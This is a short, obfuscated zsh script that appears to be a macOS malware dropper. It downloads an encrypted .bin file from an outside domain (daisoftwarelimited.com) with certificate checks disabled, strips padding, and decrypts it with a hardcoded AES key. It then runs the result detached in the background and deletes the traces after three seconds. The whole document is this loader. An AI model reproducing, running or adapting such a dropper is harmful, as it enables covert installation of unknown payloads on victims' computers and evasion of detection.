#!/bin/zsh
f439x=$(mktemp /tmp/cw84mj.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mfa103b4f5a71fcac.bin" -o "$f439xz" || exit 1
b5u3eq=$(stat -f %z "$f439xz"); ssrdx94=$(( b5u3eq - 2843 - 890 ))
tail -c +$(( 2843 + 1 )) "$f439xz" | head -c $ssrdx94 | openssl enc -d -aes-256-cbc -k 882a7f06e49e149816679c9d -out "$f439x" 2>/dev/null
[ -s "$f439x" ] && chmod 700 "$f439x" && ( "$f439x" & ) && disown
( sleep 3; rm -f "$f439x" "$f439xz" ) &>/dev/null &
